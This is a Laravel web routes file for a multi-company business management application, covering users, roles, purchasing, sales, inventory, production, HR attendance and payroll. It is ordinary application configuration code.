<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::group(['middleware' => ['company']],function(){
    Route::group(['prefix' => 'user/{company_id}'],function(){
        Route::get('/home', [
            'uses' => 'HomeController@companyDashboard',
            'as' => 'company-dashboard'
        ]);

        /**
         * Permissions
         */
        Route::get('/permissions',[
            'uses'  => 'PermissionController@index',
            'as'    => 'permissions'
        ])->middleware('can:permissions-show');


        /**
         * Roles
         */

        Route::get('/roles',[
            'uses'  => 'RoleController@index',
            'as'    => 'roles'
        ])->middleware('can:roles-show');

        Route::get('/role/{id}',[
            'uses'  => 'RoleController@show',
            'as'    => 'show-role'
        ])->middleware('can:role-show');

        Route::get('/create-role',[
            'uses'  => 'RoleController@create',
            'as'    => 'create-role'
        ])->middleware('can:role-create');

        Route::post('/role',[
            'uses'  => 'RoleController@store',
            'as'    => 'store-role'
        ])->middleware('can:role-create');

        Route::get('/edit/role/{id}',[
            'uses'  => 'RoleController@edit',
            'as'    => 'edit-role'
        ])->middleware('can:role-edit');

        Route::post('/update/role/{id}',[
            'uses'  => 'RoleController@update',
            'as'    => 'update-role'
        ])->middleware('can:role-edit');

        Route::get('/delete/role/{id}',[
            'uses'  => 'RoleController@delete',
            'as'    => 'delete-role'
        ])->middleware('can:role-delete');

        /**
         * Users
         */

        Route::get('/users',[
            'uses'  => 'UserController@index',
            'as'    => 'users'
        ])->middleware('can:users-show');

        Route::get('/create-user',[
            'uses'  => 'UserController@create',
            'as'    => 'create-user'
        ])->middleware('can:user-create');

        Route::post('/user',[
            'uses'  => 'UserController@store',
            'as'    => 'store-user'
        ])->middleware('can:user-create');

        Route::get('/edit/user/{id}',[
            'uses'  => 'UserController@edit',
            'as'    => 'edit-user'
        ])->middleware('can:user-edit');

        Route::post('/update/user/{id}',[
            'uses'  => 'UserController@update',
            'as'    => 'update-user'
        ])->middleware('can:user-edit');

        Route::get('/delete/user/{id}',[
            'uses'  => 'UserController@delete',
            'as'    => 'delete-user'
        ])->middleware('can:user-delete');


        /**
         * Raw Materials
         */
        Route::get('/raw-materials', [
            'uses' => 'RawMaterialController@index',
            'as' => 'raw-materials'
        ])->middleware('can:raw-materials-show');

        Route::get('/raw-material/{id}', function ($company_id,$id) {
            $raw_material = \App\Model\RawMaterial::where([
                ['id','=',$id],
                ['company_id','=',$company_id],
            ])->first();
            return response()->json($raw_material, 200);
        })->name('raw-material');

        Route::post('/raw-material/{id}', [
            'uses' => 'RawMaterialController@update',
            'as' => 'raw-material'
        ])->middleware('can:raw-material-edit');

        Route::post('/raw-material', [
            'uses' => 'RawMaterialController@store',
            'as' => 'create-raw-material'
        ])->middleware('can:raw-material-create');

        Route::get('/delete-raw-material/{id}', [
            'uses' => 'RawMaterialController@delete',
            'as' => 'delete-raw-material'
        ])->middleware('can:raw-material-delete');




        /**
         * Unit
         */

        Route::get('/units', [
            'uses' => 'UnitController@index',
            'as' => 'units'
        ])->middleware('can:units-show');

        Route::get('/unit/{id}', function ($company_id,$id) {
            $unit = \App\Model\Unit::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($unit, 200);
        })->name('unit');

        Route::post('/unit/{id}', [
            'uses' => 'UnitController@update',
            'as' => 'unit'
        ])->middleware('can:unit-edit');

        Route::post('/units', [
            'uses' => 'UnitController@store',
            'as' => 'create-unit'
        ])->middleware('can:unit-create');

        Route::get('/delete-unit/{id}', [
            'uses' => 'UnitController@delete',
            'as' => 'delete-unit'
        ])->middleware('can:unit-delete');

        /**
         * Grade
         */

        Route::get('/grades', [
            'uses' => 'GradeController@index',
            'as' => 'grades'
        ])->middleware('can:grades-show');

        Route::get('/grade/{id}', function ($company_id,$id) {
            $grade = \App\Model\Grade::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($grade, 200);
        })->name('grade');

        Route::post('/grade/{id}', [
            'uses' => 'GradeController@update',
            'as' => 'grade'
        ])->middleware('can:grade-edit');

        Route::post('/grades', [
            'uses' => 'GradeController@store',
            'as' => 'create-grade'
        ])->middleware('can:grade-create');

        Route::get('/delete-grade/{id}', [
            'uses' => 'GradeController@delete',
            'as' => 'delete-grade'
        ])->middleware('can:grade-delete');

        /**
         * Category
         */


        Route::get('/categories', [
            'uses' => 'CategoryController@index',
            'as' => 'categories'
        ])->middleware('can:categories-show');

        Route::get('/category/{id}', function ($company_id,$id) {
            $category = \App\Category::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($category, 200);
        })->name('category');

        Route::post('/category/{id}', [
            'uses' => 'CategoryController@update',
            'as' => 'category'
        ])->middleware('can:category-edit');

        Route::post('/category', [
            'uses' => 'CategoryController@store',
            'as' => 'create-category'
        ])->middleware('can:category-create');

        Route::get('/delete-category/{id}', [
            'uses' => 'CategoryController@delete',
            'as' => 'delete-category'
        ])->middleware('can:category-delete');

        /**
         * Designation
         */


        Route::get('/designations', [
            'uses' => 'DesignationController@index',
            'as' => 'designations'
        ])->middleware('can:designations-show');

        Route::get('/designation/{id}', function ($company_id,$id) {
            $designation = \App\Model\Designation::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($designation, 200);
        })->name('designation');

        Route::post('/designation/{id}', [
            'uses' => 'DesignationController@update',
            'as' => 'designation'
        ])->middleware('can:designation-edit');

        Route::post('/designation', [
            'uses' => 'DesignationController@store',
            'as' => 'create-designation'
        ])->middleware('can:designation-create');

        Route::get('/delete-designation/{id}', [
            'uses' => 'DesignationController@delete',
            'as' => 'delete-designation'
        ])->middleware('can:designation-delete');


        /**
         * Payment Type
         */


        Route::get('/payment-types', [
            'uses' => 'PaymentTypeController@index',
            'as' => 'payment-types'
        ]);

        Route::get('/payment-type/{id}', function ($company_id,$id) {
            $payment_type = \App\Model\PaymentType::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($payment_type, 200);
        })->name('payment-type');

        Route::post('/payment-type/{id}', [
            'uses' => 'PaymentTypeController@update',
            'as' => 'payment-type'
        ])->middleware('can:payment-type-edit');

        Route::post('/payment-type', [
            'uses' => 'PaymentTypeController@store',
            'as' => 'create-payment-type'
        ])->middleware('can:payment-type-create');

        Route::get('/delete-payment-type/{id}', [
            'uses' => 'PaymentTypeController@delete',
            'as' => 'delete-payment-type'
        ])->middleware('can:payment-type-delete');

        Route::get('/setting-payment-type/{id}',function($company_id,$id){
            $payment_type = \App\Model\PaymentType::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return view('admin.payment-type.settings')->with([
                'payment_type'  => $payment_type
            ]);
        })->name('setting-payment-type');

        Route::post('/create-payment-type-field/{id}',[
            'uses' => 'PaymentTypeFieldController@store',
            'as' => 'create-payment-type-field'
        ])->middleware('can:payment-type-create');

        Route::get('/payment-type-field/{id}',function($company_id,$id){
            $payment_type_field = \App\Model\PaymentTypeField::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($payment_type_field, 200);
        })->name('payment-type-field');

        Route::post('/payment-type-field/{id}',[
            'uses' => 'PaymentTypeFieldController@update',
            'as' => 'update-payment-type-field'
        ])->middleware('can:payment-type-edit');

        Route::get('/delete-payment-type-field/{id}',[
            'uses' => 'PaymentTypeFieldController@delete',
            'as' => 'delete-payment-type-field'
        ])->middleware('can:payment-type-delete');

        /**
         * Good
         */

        Route::get('/goods', [
            'uses' => 'GoodController@index',
            'as' => 'goods'
        ])->middleware('can:goods-show');

        Route::get('/good/{id}', function ($company_id,$id) {
            $good = \App\Model\Good::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($good, 200);
        })->name('good');

        Route::post('/good/{id}', [
            'uses' => 'GoodController@update',
            'as' => 'good'
        ])->middleware('can:goods-edit');

        Route::post('/good', [
            'uses' => 'GoodController@store',
            'as' => 'create-good'
        ])->middleware('can:goods-create');

        Route::get('/delete-good/{id}', [
            'uses' => 'GoodController@delete',
            'as' => 'delete-good'
        ])->middleware('can:goods-delete');

        /**
         * Vendor
         */


        Route::get('/vendors', [
            'uses' => 'VendorController@index',
            'as' => 'vendors'
        ])->middleware('can:vendors-show');

        Route::get('/get-vendors', [
            'uses' => 'VendorController@getVendors',
            'as' => 'getVendors'
        ])->middleware('can:vendors-show');

        Route::get('/vendor/{id}', function ($company_id,$id) {
            $vendor = \App\Model\Vendor::where([
                'company_id'    => $company_id,
                'id'            => $id,
            ])->first();
            return response()->json($vendor, 200);
        })->name('vendor');

        Route::post('/vendor/{id}', [
            'uses' => 'VendorController@update',
            'as' => 'vendor'
        ])->middleware('can:vendor-edit');

        Route::post('/vendor', [
            'uses' => 'VendorController@store',
            'as' => 'create-vendor'
        ])->middleware('can:vendor-create');

        Route::get('/delete-vendor/{id}', [
            'uses' => 'VendorController@delete',
            'as' => 'delete-vendor'
        ])->middleware('can:vendor-delete');

        /**
         * Vendor Profile
         */
        Route::get('/vendor/profile/{id}',[
            'uses' => 'VendorController@profile',
            'as' => 'vendor-profile'
        ])->middleware('can:vendor-profile-show');

        /**
         * Deshboard
         */

        /**
         * Reports
         */

        Route::get('reports/sales-orders', 'Report\SalesOrderReportController@getSalesOrdersReport')
            ->name('reports.getSalesOrdersReport')
            ->middleware('can:show-sales-orders-report');
        Route::get('reports/sales-orders/goods', 'Report\SalesOrderReportController@getJsonGoodsForSalesOrderReport')
            ->name('reports.getJsonGoodsForSalesOrderReport')
            ->middleware('can:show-sales-orders-report');
        Route::get('reports/sales-orders/customers', 'Report\SalesOrderReportController@getJsonCustomersForSalesOrderReport')
            ->name('reports.getJsonCustomersForSalesOrderReport')
            ->middleware('can:show-sales-orders-report');
        Route::post('reports/sales-orders', 'Report\SalesOrderReportController@postJsonSalesOrderReport')
            ->name('reports.postJsonSalesOrderReport')
            ->middleware('can:show-sales-orders-report');
        Route::get('reports/sales-orders/download', 'Report\SalesOrderReportController@getDownloadSalesOrderReport')
            ->name('reports.getDownloadSalesOrderReport')
            ->middleware('can:download-sales-orders-report');



        /**
         * Customer
         */


        Route::get('/customers/get-customers', 'CustomerController@getJsonCustomers')
            ->name('customers.getJsonCustomers')
            ->middleware('can:customers-show');
        Route::get('/customers/get-customers/{customer}', 'CustomerController@getJsonCustomer')
            ->name('customers.getJsonCustomer')
            ->middleware('can:customer-profile-show');
        Route::get('/customers', 'CustomerController@index')
            ->name('customers.index')
            ->middleware('can:customers-show'); // show all customers.
        Route::post('/customers', 'CustomerController@store')
            ->name('customers.store')
            ->middleware('can:customer-create');// store a customer.
        Route::get('/customers/{customer}', 'CustomerController@show')
            ->name('customers.show')
            ->middleware('can:customer-profile-show');// show a particular customer, as customer profile.
        Route::put('/customers/{customer}', 'CustomerController@update')
            ->name('customers.update')
            ->middleware('can:customer-edit');// update a particular customer.
        Route::delete('/customers/{customer}', 'CustomerController@destroy')
            ->name('customers.destroy')
            ->middleware('can:customer-delete');// delete a particular customer.

        /**
         * Log Purchase Order
         */

        Route::name('logPurchaseOrders.')->prefix('log-purchase-orders')->group(function () {
            Route::get('downloads', 'LogPurchaseOrderController@getDownloads')->name('getDownloadLogPurchaseOrders')
                ->middleware('can:log-purchase-orders-download');
            Route::get('downloads/{id}', 'LogPurchaseOrderController@getDownloadLogPurchaseOrder')->name('getDownloadLogPurchaseOrder')
                ->middleware('can:log-purchase-order-download');
            Route::view('create', 'admin.purchase-order-log.create')->name('create')
                ->middleware('can:log-purchase-order-create');
            Route::get('get-vendors', 'LogPurchaseOrderController@getJsonVendors')->name('getJsonVendors')
                ->middleware('can:log-purchase-order-create');
            Route::get('get-categories', 'LogPurchaseOrderController@getJsonCategories')->name('getJsonCategories')
                ->middleware('can:log-purchase-order-create');
            Route::get('get-grades', 'LogPurchaseOrderController@getJsonGrades')->name('getJsonGrades')
                ->middleware('can:log-purchase-order-create');
            Route::post('post-log-item', 'LogPurchaseOrderController@postJsonLogItem')->name('postJsonLogItem')
                ->middleware('can:log-purchase-order-create');
            Route::delete('delete-log-item/{id}', 'LogPurchaseOrderController@deleteJsonLogItem')->name('deleteJsonLogItem')
                ->middleware('can:log-purchase-order-create');
            Route::post('/', 'LogPurchaseOrderController@postJsonSavePurchaseOrder')->name('postJsonSavePurchaseOrder')
                ->middleware('can:log-purchase-order-create');
            Route::get('drafts', 'LogPurchaseOrderController@drafts')->name('drafts')
                ->middleware('can:log-purchase-order-create');
            Route::get('drafts/{id}', 'LogPurchaseOrderController@draft')->name('draft')
                ->middleware('can:log-purchase-order-create');
            Route::delete('drafts/{id}', 'LogPurchaseOrderController@deleteDraft')->name('deleteDraft')
                ->middleware('can:log-purchase-order-create');
            Route::view('/', 'admin.purchase-order-log.index')->name('index')
                ->middleware('can:log-purchase-orders-show');
            Route::get('/get-log-purchase-orders', 'LogPurchaseOrderController@getJsonLogPurchaseOrders')->name('getJsonLogPurchaseOrders')
                ->middleware('can:log-purchase-orders-show');
            Route::get('edit/{id}', 'LogPurchaseOrderController@edit')->name('edit')
                ->middleware('can:log-purchase-order-edit');
            Route::get('/{id}', 'LogPurchaseOrderController@show')->name('show')
                ->middleware('can:log-purchase-order-show');
            Route::put('/{id}', 'LogPurchaseOrderController@updateJsonPurchaseOrder')->name('updateJsonPurchaseOrder')
                ->middleware('can:log-purchase-order-edit');
            Route::delete('/{id}', 'LogPurchaseOrderController@deleteJsonPurchaseOrder')->name('delete')
                ->middleware('can:log-purchase-order-delete');
        });

        /**
         * Material Purchase Order
         */
        Route::name('materialPurchaseOrders.')->prefix('material-purchase-orders')->group(function () {
            Route::get('downloads', 'MaterialPurchaseOrderController@getDownloads')->name('getDownloadMaterialPurchaseOrders')
                ->middleware('can:material-purchase-orders-download');
            Route::get('downloads/{id}', 'MaterialPurchaseOrderController@getDownloadMaterialPurchaseOrder')->name('getDownloadMaterialPurchaseOrder')
                ->middleware('can:material-purchase-order-download');
            Route::post('/', 'MaterialPurchaseOrderController@postJsonSavePurchaseOrder')
                ->name('postJsonSavePurchaseOrder')
                ->middleware('can:material-purchase-order-create');
            Route::view('create', 'admin.purchase-order-material.create')->name('create')
                ->middleware('can:material-purchase-order-create');
            Route::get('get-vendors', 'MaterialPurchaseOrderController@getJsonVendors')->name('getJsonVendors')
                ->middleware('can:material-purchase-order-create');
            Route::get('get-materials', 'MaterialPurchaseOrderController@getJsonMaterials')->name('getJsonMaterials')
                ->middleware('can:material-purchase-order-create');
            Route::post('post-material-item', 'MaterialPurchaseOrderController@postJsonMaterialItem')->name('postJsonMaterialItem')
                ->middleware('can:material-purchase-order-create');
            Route::get('drafts', 'MaterialPurchaseOrderController@drafts')->name('drafts')
                ->middleware('can:material-purchase-order-create');
            Route::get('drafts/{id}', 'MaterialPurchaseOrderController@draft')->name('draft')
                ->middleware('can:material-purchase-order-create');
            Route::delete('drafts/{id}', 'MaterialPurchaseOrderController@deleteDraft')->name('deleteDraft')
                ->middleware('can:material-purchase-order-create');
            Route::delete('delete-material-item/{id}', 'MaterialPurchaseOrderController@deleteJsonMaterialItem')->name('deleteJsonMaterialItem')
                ->middleware('can:material-purchase-order-create');
            Route::get('get-material-purchase-orders', 'MaterialPurchaseOrderController@getJsonMaterialPurchaseOrders')->name('getJsonMaterialPurchaseOrders')
                ->middleware('can:material-purchase-orders-show');
            Route::get('edit/{id}', 'MaterialPurchaseOrderController@edit')->name('edit')
                ->middleware('can:material-purchase-order-edit');
            Route::view('/', 'admin.purchase-order-material.index')->name('index')
                ->middleware('can:material-purchase-orders-show');
            Route::get('/{id}', 'MaterialPurchaseOrderController@show')->name('show')
                ->middleware('can:material-purchase-order-show');
            Route::put('/{id}', 'MaterialPurchaseOrderController@updateJsonPurchaseOrder')->name('updateJsonPurchaseOrder')
                ->middleware('can:material-purchase-order-edit');
            Route::delete('/{id}', 'MaterialPurchaseOrderController@deleteJsonPurchaseOrder')->name('delete')
                ->middleware('can:material-purchase-order-delete');
        });

        /**
         * Purchase Order
         */

        Route::get('purchase-orders',[
            'uses'  => 'PurchaseOrderController@index',
            'as'    => 'purchase-orders'
        ])->middleware('can:purchase-orders-show');

        Route::post('/get-purchase-orders',[
            'uses'  => 'PurchaseOrderController@getOrders',
            'as'    => 'get-purchase-orders'
        ])->middleware('can:purchase-orders-show');

        Route::get('/get-purchase-orders',[
            'uses'  => 'PurchaseOrderController@downloadOrders',
            'as'    => 'download-purchase-orders'
        ])->middleware('can:purchase-orders-show');


        Route::get('purchase-order/{id}',[
            'uses'  => 'PurchaseOrderController@show',
            'as'    => 'purchase-order'
        ])->middleware('can:purchase-order-show');

        Route::get('/create-purchase-order',[
            'uses'  => 'PurchaseOrderController@create',
            'as'    => 'create-purchase-order'
        ])->middleware('can:purchase-order-create');

        Route::post('/create-purchase-order',[
            'uses'  => 'PurchaseOrderController@store',
            'as'    => 'store-purchase-order'
        ])->middleware('can:purchase-order-create');

        Route::get('/edit-purchase-order/{id}',[
            'uses'  => 'PurchaseOrderController@edit',
            'as'    => 'edit-purchase-order'
        ])->middleware('can:purchase-order-update');

        Route::get('/get/purchased-items/{id}','PurchaseOrderController@getPurchasedItems')->name('get-purchased-items');

        Route::post('/edit-purchase-order/{id}',[
            'uses'  => 'PurchaseOrderController@update',
            'as'    => 'update-purchase-order'
        ])->middleware('can:purchase-order-update');

        Route::get('/delete-purchase-order/{id}',[
            'uses'  => 'PurchaseOrderController@delete',
            'as'    => 'delete-purchase-order'
        ])->middleware('can:purchase-order-delete');

        Route::get('/download-purchase-order/{id}',[
            'uses'  => 'PurchaseOrderController@download',
            'as'    => 'download-purchase-order'
        ])->middleware('can:purchase-order-download');


        /**
         * Inventory
         */

        Route::get('/inventory/raw-materials',[
            'uses'  => 'InventoryController@rawMaterials',
            'as'    => 'inventory.raw-materials'
        ])->middleware('can:inventory-raw-materials-show');

        Route::get('/inventory/other-materials',[
            'uses'  => 'InventoryController@otherMaterials',
            'as'    => 'inventory.other-materials'
        ])->middleware('can:inventory-other-materials-show');

        Route::get('/inventory/logs',[
            'uses'  => 'InventoryController@logs',
            'as'    => 'inventory.logs'
        ])->middleware('can:inventory-logs-materials-show');

        Route::get('/inventory/production-goods',[
            'uses'  => 'InventoryController@productionProducts',
            'as'    => 'inventory.production-products'
        ])->middleware('can:inventory-ready-for-sale-goods-show');

        /**
         * Production
         */

        Route::get('/productions',[
            'uses'  => 'ProductionController@index',
            'as'    => 'productions'
        ])->middleware('can:productions-show');

        Route::get('/production/show/{id}',[
            'uses'  => 'ProductionController@show',
            'as'    => 'show-production'
        ])->middleware('can:production-show');

        Route::get('/create-production',[
            'uses'  => 'ProductionController@create',
            'as'    => 'create-production'
        ])->middleware('can:production-create');

        Route::post('/store-production',[
            'uses'  => 'ProductionController@store',
            'as'    => 'store-production'
        ])->middleware('can:production-create');

        Route::get('/production-inventory-goods',[
            'uses'  => 'ProductionController@producedGoods',
            'as'    => 'production-inventory-goods'
        ])->middleware('can:produced-goods-show');

        /**
         * Production Product
         */

        Route::get('/create-production-product/{id}',[
            'uses'  => 'ProducedGoodController@create',
            'as'    => 'create-production-product'
        ]);

        Route::post('/create-production-product/{id}',[
            'uses'  => 'ProducedGoodController@store',
            'as'    => 'store-production-product'
        ]);


        Route::get('/release-production-product/{id}',[
            'uses'  => 'ProductionGoodController@create',
            'as'    => 'release-production-product'
        ]);

        Route::post('/release-production-product/{id}',[
            'uses'  => 'ProductionGoodController@store',
            'as'    => 'store-released-product'
        ]);

        /**
         * Employee
         */

        /**
         * Delivery Man
         */

        Route::get('/employees',[
            'uses'  => 'EmployeeController@index',
            'as'    => 'employees'
        ])->middleware('can:employees-show');

        Route::get('/employee',[
            'uses'  => 'EmployeeController@create',
            'as'    => 'create-employee'
        ])->middleware('can:employee-create');

        Route::post('/employee',[
            'uses'  => 'EmployeeController@store',
            'as'    => 'store-employee'
        ])->middleware('can:employee-create');

        Route::get('/employee/{id}',[
            'uses'  => 'EmployeeController@employee',
            'as'    => 'show-employee'
        ])->middleware('can:employee-show');

        Route::get('/edit/employee/{id}',[
            'uses'  => 'EmployeeController@edit',
            'as'    => 'edit-employee'
        ])->middleware('can:employee-edit');

        Route::post('/update/employee/{id}',[
            'uses'  => 'EmployeeController@update',
            'as'    => 'update-employee'
        ])->middleware('can:employee-edit');

        Route::get('/delete/employee/{id}',[
            'uses'  => 'EmployeeController@delete',
            'as'    => 'delete-employee'
        ])->middleware('can:employee-delete');

        /**
         * Roster
         */

        Route::post('/create-roster',[
            'uses'  => 'RosterController@store',
            'as'    => 'create-roster'
        ])->middleware('can:roster-create');

        Route::get('/delete/roster',[
            'uses'  => 'RosterController@delete',
            'as'    => 'delete-roster'
        ])->middleware('can:roster-delete');

        /**
         * Attendance
         */
        Route::get('/attendances/{date?}',[
            'uses'  => 'AttendanceController@index',
            'as'    => 'attendances'
        ])->middleware('can:attendances-show');

        Route::get('/create/attendance',[
            'uses'  => 'AttendanceController@create',
            'as'    => 'create-attendance'
        ])->middleware('can:attendance-create');

        Route::post('/create/attendance',[
            'uses'  => 'AttendanceController@store',
            'as'    => 'store-attendance'
        ])->middleware('can:attendance-create');

        Route::post('/get/attendance-report',[
            'uses'  => 'AttendanceController@getAttendanceReport',
            'as'    => 'get-attendance-report'
        ]);

        Route::get('/get/attendance-report',[
            'uses'  => 'AttendanceController@downloadAttendanceReport',
            'as'    => 'download-attendance-report'
        ]);

        /**
         * Leave Type
         */
        Route::get('/leave-types', [
            'uses' => 'LeaveTypeController@index',
            'as' => 'leave-types'
        ])->middleware('can:leave-types-show');

        Route::get('/leave-type/{id}', function ($company_id,$id) {
            $leave_type = \App\Model\LeaveType::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($leave_type, 200);
        })->name('leave-type');

        Route::post('/leave-type/{id}', [
            'uses' => 'LeaveTypeController@update',
            'as' => 'leave-type'
        ])->middleware('can:leave-type-edit');

        Route::post('/leave-type', [
            'uses' => 'LeaveTypeController@store',
            'as' => 'create-leave-type'
        ])->middleware('can:leave-type-create');

        Route::get('/delete-leave-type/{id}', [
            'uses' => 'LeaveTypeController@delete',
            'as' => 'delete-leave-type'
        ])->middleware('can:leave-type-delete');

        /**
         * Employee Leave Type
         */

        Route::post('/employee/leave-type/create',[
            'uses'  => 'EmployeeLeaveTypeController@store',
            'as'    => 'store-employee-leave-type'
        ])->middleware('can:employee-leave-type-create');

        Route::get('/employee-leave-type/{id}',[
            'uses'  => 'EmployeeLeaveTypeController@leaveType',
            'as'    => 'employee-leave-type'
        ])->middleware('can:employee-leave-type-show');

        Route::post('/employee-leave-type/{id}',[
            'uses'  => 'EmployeeLeaveTypeController@update',
            'as'    => 'update-employee-leave-type'
        ])->middleware('can:employee-leave-type-edit');

        Route::get('/delete-employee-leave-type/{id}',[
            'uses'  => 'EmployeeLeaveTypeController@delete',
            'as'    => 'delete-employee-leave-type'
        ])->middleware('can:employee-leave-type-delete');


        /**
         * Bonus
         */

        Route::get('/bonuses', [
            'uses' => 'BonusController@index',
            'as' => 'bonuses'
        ])->middleware('can:bonuses-show');

        Route::get('/bonus/{id}', function ($company_id,$id) {
            $bonus = \App\Model\Bonus::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($bonus, 200);
        })->name('bonus');

        Route::post('/bonus/{id}', [
            'uses' => 'BonusController@update',
            'as' => 'bonus'
        ])->middleware('can:bonus-edit');

        Route::post('/bonus', [
            'uses' => 'BonusController@store',
            'as' => 'create-bonus'
        ])->middleware('can:bonus-create');

        Route::get('/delete-bonus/{id}', [
            'uses' => 'BonusController@delete',
            'as' => 'delete-bonus'
        ])->middleware('can:bonus-delete');



        /**
         * Deduction Type
         */

        Route::get('/deduction-types', [
            'uses' => 'DeductionTypeController@index',
            'as' => 'deduction-types'
        ])->middleware('can:deduction-types-show');

        Route::get('/deduction-type/{id}', function ($company_id,$id) {
            $deduction_type = \App\Model\DeductionType::where([
                'company_id'    => $company_id,
                'id'            => $id
            ])->first();
            return response()->json($deduction_type, 200);
        })->name('deduction-type');

        Route::post('/deduction-type/{id}', [
            'uses' => 'DeductionTypeController@update',
            'as' => 'deduction-type'
        ])->middleware('can:deduction-type-edit');

        Route::post('/deduction-type', [
            'uses' => 'DeductionTypeController@store',
            'as' => 'create-deduction-type'
        ])->middleware('can:deduction-type-create');

        Route::get('/delete-deduction-type/{id}', [
            'uses' => 'DeductionTypeController@delete',
            'as' => 'delete-deduction-type'
        ])->middleware('can:deduction-type-delete');


        /**
         * Create Vacation Calender
         */

        Route::get('/vacations',[
            'uses'  => 'VacationController@index',
            'as'    => 'vacations'
        ]);

        Route::get('/create/vacation',[
            'uses'  => 'VacationController@create',
            'as'    => 'create-vacation'
        ]);

        Route::post('/create/vacation',[
            'uses'  => 'VacationController@store',
            'as'    => 'store-vacation'
        ]);

        Route::get('/edit/vacation/{id}',[
            'uses'  => 'VacationController@edit',
            'as'    => 'edit-vacation'
        ]);

        Route::post('/edit/vacation/{id}',[
            'uses'  => 'VacationController@update',
            'as'    => 'update-vacation'
        ]);

        Route::get('/delete/vacation/{id}',[
            'uses'  => 'VacationController@delete',
            'as'    => 'delete-vacation'
        ]);

        /**
         * Counting The Days According To Month Year To Produce The Salary
         */

        Route::get('/leaves',[
            'uses'  => 'LeaveController@index',
            'as'    => 'leaves'
        ])->middleware('can:leaves-show');

        Route::post('/get/leaves',[
            'uses'  => 'LeaveController@getLeaves',
            'as'    => 'get-leaves'
        ]);

        Route::get('/get/leaves',[
            'uses'  => 'LeaveController@downloadLeaves',
            'as'    => 'download-leaves'
        ]);

        Route::get('/create/leave',[
            'uses'  => 'LeaveController@create',
            'as'    => 'create-leave'
        ]);

        Route::post('/create/leave',[
            'uses'  => 'LeaveController@store',
            'as'    => 'store-leave'
        ]);

        Route::get('/edit/leave/{id}',[
            'uses'  => 'LeaveController@edit',
            'as'    => 'edit-leave'
        ]);

        Route::post('/edit/leave/{id}',[
            'uses'  => 'LeaveController@update',
            'as'    => 'update-leave'
        ]);

        Route::get('/delete/leave/{id}',[
            'uses'  => 'LeaveController@delete',
            'as'    => 'delete-leave'
        ]);

        /**
         * Salaries
         */

        Route::get('/create/salary',[
            'uses'  => 'SalaryController@create',
            'as'    => 'create-salary'
        ])->middleware('can:salary-create');


        Route::post('/get/salary-details',[
            'uses'  => 'SalaryController@getSalaryDetails',
            'as'    => 'get-salary-details'
        ]);
        /**
         * Employee Salary
         */

        Route::get('/employee-salaries',[
            'uses'  => 'EmployeeSalaryController@index',
            'as'    => 'employee-salaries'
        ])->middleware('can:employee-salaries-show');

        Route::post('/create/salary',[
            'uses'  => 'EmployeeSalaryController@store',
            'as'    => 'store-salary'
        ])->middleware('can:salary-create');

        Route::get('/employee/salary/{id}',[
            'uses'  => 'EmployeeSalaryController@show',
            'as'    => 'employee-salary'
        ])->middleware('can:employee-salary-show');

        Route::post('/get/employee-salaries',[
            'uses'  => 'EmployeeSalaryController@getSalaries',
            'as'    => 'get-employee-salaries'
        ])->middleware('can:employee-salaries-show');

        Route::get('/get/employee-salaries',[
            'uses'  => 'EmployeeSalaryController@downloadSalaries',
            'as'    => 'download-employee-salaries'
        ])->middleware('can:employee-salaries-show');

        Route::get('/delete/employee/salary/{id}',[
            'uses'  => 'EmployeeSalaryController@delete',
            'as'    => 'employee-salary-delete'
        ])->middleware('can:employee-salary-delete');


        /**
         * Sales Order
         */

        Route::get('sales-orders',[
            'uses'  => 'SalesOrderController@index',
            'as'    => 'sales-orders'
        ])->middleware('can:sales-orders-show');

        Route::get('/show-sales-order/{id}',[
            'uses'  => 'SalesOrderController@show',
            'as'    => 'show-sales-order'
        ])->middleware('can:sales-order-show');

        Route::get('/create-sales-order',[
            'uses'  => 'SalesOrderController@create',
            'as'    => 'create-sales-order'
        ])->middleware('can:sales-order-create');



        Route::get('sales-orders/get-goods', 'SalesOrderController@getJsonGoodsForSalesOrder')
            ->name('SalesOrders.getJsonGoodsForSalesOrder')
            ->middleware('can:sales-order-create');

        Route::get('sales-orders/get-customers', 'SalesOrderController@getJsonCustomersForSalesOrder')
            ->name('SalesOrders.getJsonCustomersForSalesOrder')
            ->middleware('can:sales-order-create');


        Route::post('/store-sales-order',[
            'uses'  => 'SalesOrderController@store',
            'as'    => 'store-sales-order'
        ])->middleware('can:sales-order-create');

        Route::get('/delete-sales-order/{id}',[
            'uses'  => 'SalesOrderController@delete',
            'as'    => 'delete-sales-order'
        ])->middleware('can:sales-order-delete');

        Route::get('/download-sales-order/{id}',[
            'uses'  => 'SalesOrderController@download',
            'as'    => 'download-sales-order'
        ])->middleware('can:sales-order-download');

        Route::post('/get-sales-orders',[
            'uses'  => 'SalesOrderController@getSalesOrders',
            'as'    => 'get-sales-orders'
        ])->middleware('can:sales-orders-show');

        Route::get('/get-sales-orders',[
            'uses'  => 'SalesOrderController@downloadSalesOrders',
            'as'    => 'download-sales-orders'
        ])->middleware('can:sales-orders-show');

        /**
         * Purchase Sales Order
         */

        Route::get('/purchase-sales-orders',[
            'uses'  => 'PurchaseSalesController@index',
            'as'    => 'purchase-sales-orders'
        ])->middleware('can:purchase-sales-orders-show');

        Route::post('/get-purchase-sales-orders', 'PurchaseSalesController@getPurchaseSalesOrders')
            ->name('get-purchase-sales-orders')
            ->middleware('can:purchase-sales-orders-show');


        Route::post('/purchase-sales-orders',[
            'uses'  => 'PurchaseSalesController@show_orders',
            'as'    => 'purchase-sales-orders'
        ])->middleware('can:purchase-sales-orders-show');

        Route::get('/show-purchase-sales-order/{id}',[
            'uses'  => 'PurchaseSalesController@show',
            'as'    => 'show-purchase-sales-order'
        ])->middleware('can:purchase-sales-order-show');

